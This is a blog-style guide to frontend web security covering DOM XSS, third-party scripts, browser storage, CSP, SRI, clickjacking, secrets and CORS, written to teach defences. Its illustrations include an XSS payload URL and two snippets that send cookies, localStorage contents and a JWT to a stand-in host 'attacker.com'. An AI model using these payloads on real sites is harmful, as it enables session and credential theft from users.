---
title: "Frontend Security - Core Concepts You Need to Know"
labels: ["security","frontend","javascript","webdev","Archive"]
published: true
date: 2025-01-30T20:22:00+09:00
readerComments: "ALLOW"
language: en
bloggerPostId: "4816226299361200343"
source: "archive"
archivePath: "_archive/dev/security/frontend-security-guide-kr.md"
---

# Frontend Security - Core Concepts You Need to Know

The frontend is the layer that interacts directly with users, which exposes it to a wide range of security threats. This post walks through the core concepts of frontend security with practical examples.

---

## 1. DOM-based Vulnerabilities ⭐️⭐️⭐️

### Concept
DOM (Document Object Model) based vulnerabilities happen when client-side JavaScript handles user input unsafely.

### A DOM XSS Attack Example

**Vulnerable code:**
```javascript
// Dangerous! Takes a value straight from the URL and inserts it into the DOM
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('welcome').innerHTML = `Welcome, ${name}!`;

// URL: https://example.com?name=<img src=x onerror=alert('XSS')>
```

**Safe code:**
```javascript
// Use textContent (doesn't parse HTML)
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('welcome').textContent = `Welcome, ${name}!`;

// Or use DOMPurify
import DOMPurify from 'dompurify';
const name = new URLSearchParams(window.location.search).get('name');
const clean = DOMPurify.sanitize(name);
document.getElementById('welcome').innerHTML = `Welcome, ${clean}!`;
```

### Dangerous DOM APIs

```javascript
// ❌ Dangerous APIs
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
eval(userInput);
setTimeout(userInput, 1000);
setInterval(userInput, 1000);
new Function(userInput);

// ✅ Safe alternatives
element.textContent = userInput;
element.setAttribute('data-value', userInput);
const parser = new DOMParser();
const doc = parser.parseFromString(userInput, 'text/html');
```

### DOM Security in React

```javascript
// React is safe by default
function Welcome({ name }) {
  return <div>Welcome, {name}!</div>; // escaped automatically
}

// Dangerous! dangerouslySetInnerHTML
function Comment({ html }) {
  // Always sanitize before using it
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

---

## 2. Third-party Script Risks ⭐️⭐️⭐️

### Concept
External scripts can access all of the data on your page, so an untrusted script is a serious security threat.

### The Risks

**What an external script can do:**
```javascript
// Read all cookies (except httpOnly ones)
const cookies = document.cookie;

// Read all of localStorage/sessionStorage
const token = localStorage.getItem('authToken');

// Intercept keystrokes
document.addEventListener('keypress', (e) => {
  // Could send passwords and more to an outside server
});

// Tamper with the page
document.body.innerHTML = 'Malicious content';

// Exfiltrate sensitive information
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ 
    cookies: document.cookie,
    localStorage: {...localStorage}
  })
});
```

### Using External Scripts Safely

**1. Use Subresource Integrity (SRI)**
```html
<!-- Add an integrity attribute to CDN scripts -->
<script 
  src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"
  integrity="sha384-9o+vDMRZ0qPpYHVkHU5UG3JvW7fE8pR2Y8eTF0lPsGm7X3gEUlKvW2j8lBv8pRh0"
  crossorigin="anonymous">
</script>

<!-- Generating the integrity hash -->
<script>
// openssl dgst -sha384 -binary script.js | openssl base64 -A
</script>
```

**2. Use only trusted CDNs**
```javascript
// ✅ Trusted CDNs
// - cdnjs.cloudflare.com
// - unpkg.com
// - cdn.jsdelivr.net

// ❌ Avoid unknown CDNs
```

**3. Set a Content Security Policy (CSP)**
```html
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self' https://cdn.jsdelivr.net; 
               style-src 'self' https://fonts.googleapis.com;">
```

### Using Google Analytics, Facebook Pixel, etc. Safely

```javascript
// Manage them through Google Tag Manager (recommended)
<script>
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-XXXXXX');
</script>

// Don't send sensitive information
gtag('event', 'purchase', {
  value: 10000,
  currency: 'KRW',
  // ❌ Never send user emails, phone numbers, etc.
});
```

---

## 3. Browser Storage Security ⭐️⭐️

### Concept
Browser storage (localStorage, sessionStorage, IndexedDB) is convenient, but it's vulnerable to XSS attacks.

### localStorage vs sessionStorage vs Cookie

```javascript
// localStorage: persistent, shared across all tabs
localStorage.setItem('theme', 'dark');

// sessionStorage: cleared when the tab is closed
sessionStorage.setItem('tempData', 'value');

// Cookie: sent to the server automatically, supports the httpOnly option
document.cookie = "sessionId=abc123; Secure; HttpOnly; SameSite=Strict";
```

### ❌ What Not to Store in localStorage

```javascript
// Never do this!
localStorage.setItem('jwt', 'eyJhbGciOiJIUzI1NiIs...');
localStorage.setItem('password', 'mypassword123');
localStorage.setItem('creditCard', '1234-5678-9012-3456');
localStorage.setItem('apiKey', 'sk-1234567890');

// An XSS attack can steal it easily
<script>
  fetch('https://attacker.com/steal?data=' + localStorage.getItem('jwt'));
</script>
```

### ✅ Storing Tokens Safely

**1. Use HttpOnly cookies (recommended)**
```javascript
// Set on the server
res.cookie('authToken', token, {
  httpOnly: true,    // not accessible from JavaScript
  secure: true,      // HTTPS only
  sameSite: 'strict',
  maxAge: 3600000    // 1 hour
});

// The client sends it automatically
fetch('/api/user', {
  credentials: 'include' // include cookies
});
```

**2. Keep it in memory only (for SPAs)**
```javascript
// Zustand store example
import create from 'zustand';

const useAuthStore = create((set) => ({
  token: null,
  setToken: (token) => set({ token }),
  clearToken: () => set({ token: null })
}));

// The token has to be reissued on page refresh
```

**3. sessionStorage + short expiration**
```javascript
// Second-best option: sessionStorage (cleared when the tab closes)
const saveToken = (token) => {
  sessionStorage.setItem('tempToken', token);
  
  // Set a short expiration
  setTimeout(() => {
    sessionStorage.removeItem('tempToken');
  }, 15 * 60 * 1000); // 15 minutes
};
```

### IndexedDB Security

```javascript
// IndexedDB is vulnerable to XSS too
const request = indexedDB.open('myDatabase', 1);

request.onsuccess = (event) => {
  const db = event.target.result;
  
  // ✅ Store only non-sensitive data
  const transaction = db.transaction(['settings'], 'readwrite');
  const store = transaction.objectStore('settings');
  store.add({ theme: 'dark', language: 'ko' });
  
  // ❌ Don't store sensitive data
  // store.add({ password: '...', creditCard: '...' });
};
```

---

## 4. Content Security Policy (CSP) ⭐️⭐️⭐️

### Concept
CSP is a security policy that tells the browser which resources it's allowed to load.

### Basic CSP Setup

```html
<!-- HTML meta tag -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' https://cdn.jsdelivr.net; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data: https:; 
               font-src 'self' https://fonts.gstatic.com;">
```

```javascript
// Setting it in Express.js
const helmet = require('helmet');

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      connectSrc: ["'self'", "https://api.example.com"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  })
);
```

### CSP Directives Explained

```javascript
// default-src: the default for all resources
"default-src 'self'"

// script-src: JavaScript sources
"script-src 'self' https://cdn.jsdelivr.net"

// style-src: CSS sources
"style-src 'self' 'unsafe-inline'" // allow inline styles

// img-src: image sources
"img-src 'self' data: https:" // allow data URIs and any HTTPS image

// connect-src: fetch, XMLHttpRequest, etc.
"connect-src 'self' https://api.example.com"

// frame-src: iframe sources
"frame-src 'none'" // block iframes

// object-src: <object>, <embed>, etc.
"object-src 'none'" // block Flash and the like
```

### Dealing with Inline Scripts

**❌ CSP blocks inline scripts**
```html
<!-- Blocked -->
<script>
  console.log('Hello');
</script>

<button onclick="handleClick()">Click</button>
```

**✅ Fix 1: Move them to an external file**
```html
<script src="/js/app.js"></script>

<button id="myButton">Click</button>

<!-- app.js -->
<script>
document.getElementById('myButton').addEventListener('click', handleClick);
</script>
```

**✅ Fix 2: Use a nonce**
```javascript
// Generate a random nonce on the server
const crypto = require('crypto');
const nonce = crypto.randomBytes(16).toString('base64');

res.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'nonce-${nonce}'`
);

res.render('page', { nonce });
```

```html
<!-- Template -->
<script nonce="<%= nonce %>">
  console.log('Allowed');
</script>
```

### CSP Violation Reports

```javascript
// Report CSP violations to the server
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      reportUri: '/csp-violation-report'
    }
  })
);

app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP violation:', req.body);
  // Logging, alerts, etc.
  res.status(204).end();
});
```

---

## 5. Subresource Integrity (SRI) ⭐️⭐️

### Concept
SRI lets you verify that a file loaded from a CDN hasn't been tampered with.

### Generating and Using SRI Hashes

```bash
# Generate the hash
openssl dgst -sha384 -binary script.js | openssl base64 -A

# Or use an online tool
# https://www.srihash.org/
```

```html
<!-- SRI example -->
<script 
  src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"
  integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We"
  crossorigin="anonymous">
</script>

<link 
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
  integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
  crossorigin="anonymous">
```

### Generating SRI Automatically with Webpack

```javascript
// webpack.config.js
const SriPlugin = require('webpack-subresource-integrity');

module.exports = {
  output: {
    crossOriginLoading: 'anonymous',
  },
  plugins: [
    new SriPlugin({
      hashFuncNames: ['sha256', 'sha384'],
      enabled: process.env.NODE_ENV === 'production',
    }),
  ],
};
```

---

## 6. Preventing Clickjacking ⭐️⭐️

### Concept
Clickjacking is an attack that uses a transparent iframe to trick users into performing actions they didn't intend.

### The X-Frame-Options Header

```javascript
// Express.js
app.use((req, res, next) => {
  // Block iframes entirely
  res.setHeader('X-Frame-Options', 'DENY');
  
  // Allow the same origin only
  // res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  
  // Allow a specific domain only
  // res.setHeader('X-Frame-Options', 'ALLOW-FROM https://trusted.com');
  
  next();
});
```

### CSP frame-ancestors

```javascript
// More flexible control (recommended)
res.setHeader(
  'Content-Security-Policy',
  "frame-ancestors 'none'" // block iframes
  // "frame-ancestors 'self'" // same origin only
  // "frame-ancestors https://trusted.com" // specific domain only
);
```

### Preventing Clickjacking with JavaScript

```javascript
// Check whether the page is inside an iframe
if (window.top !== window.self) {
  // We're inside an iframe
  
  // Option 1: replace the parent page with this page
  window.top.location = window.self.location;
  
  // Option 2: show a warning
  document.body.innerHTML = '<h1>This page cannot be displayed in an iframe.</h1>';
}
```

---

## 7. Preventing Exposure of Sensitive Information ⭐️⭐️

### Concept
Anyone can read frontend code, so it must never contain sensitive information.

### ❌ Never Do This

```javascript
// Never hardcode these in source!
const API_KEY = 'sk-1234567890abcdef';
const SECRET = 'my-secret-key';
const PASSWORD = 'admin123';
const INTERNAL_URL = 'https://internal-api.company.com';

// Never print sensitive information to the console
console.log('User password:', password);
console.log('JWT Token:', token);
```

### ✅ The Safe Way

**1. Use environment variables (build time)**
```javascript
// .env
REACT_APP_API_URL=https://api.example.com
NEXT_PUBLIC_API_KEY=pk_public_key_only

// Usage
const apiUrl = process.env.REACT_APP_API_URL;
```

**2. Serve configuration from the server**
```javascript
// The server passes along public settings only
app.get('/api/config', (req, res) => {
  res.json({
    apiUrl: process.env.PUBLIC_API_URL,
    stripePublicKey: process.env.STRIPE_PUBLIC_KEY,
    // never send the private key
  });
});

// Client
const config = await fetch('/api/config').then(r => r.json());
```

**3. Strip console logs in production**
```javascript
// Webpack/Vite setup
if (process.env.NODE_ENV === 'production') {
  console.log = () => {};
  console.warn = () => {};
  console.error = () => {};
}

// Or use babel-plugin-transform-remove-console
```

---

## 8. Understanding CORS Preflight ⭐️

### Concept
A CORS preflight is when the browser sends an OPTIONS request to check permissions before the actual request.

### Simple Request vs Preflight Request

**Simple request (no preflight):**
```javascript
// GET, HEAD, POST only
// Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain only
fetch('https://api.example.com/data', {
  method: 'GET',
  headers: {
    'Content-Type': 'text/plain'
  }
});
```

**Preflight request (OPTIONS is sent first):**
```javascript
// PUT, DELETE, PATCH, etc.
// Content-Type: application/json
// Custom headers
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token'
  },
  body: JSON.stringify({ data: 'value' })
});
```

### Handling CORS on the Server

```javascript
// Express.js
app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', 'https://myapp.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Max-Age', '86400'); // cache for 24 hours
  res.sendStatus(204);
});
```

---

## Conclusion

Frontend security checklist:

### Essential Measures (⭐️⭐️⭐️)
- ✅ Use DOM APIs safely (textContent, DOMPurify)
- ✅ Apply SRI to external scripts
- ✅ Set CSP headers

### Important Measures (⭐️⭐️)
- ✅ Never store sensitive information in localStorage
- ✅ Use HttpOnly cookies
- ✅ Set X-Frame-Options
- ✅ Never hardcode sensitive information in source

### Extra Hardening (⭐️)
- ✅ Configure CORS correctly
- ✅ Strip console logs in production
- ✅ Update dependencies regularly (npm audit)

**The core principle of frontend security is "never trust the client." All important validation and authentication must happen on the server.**
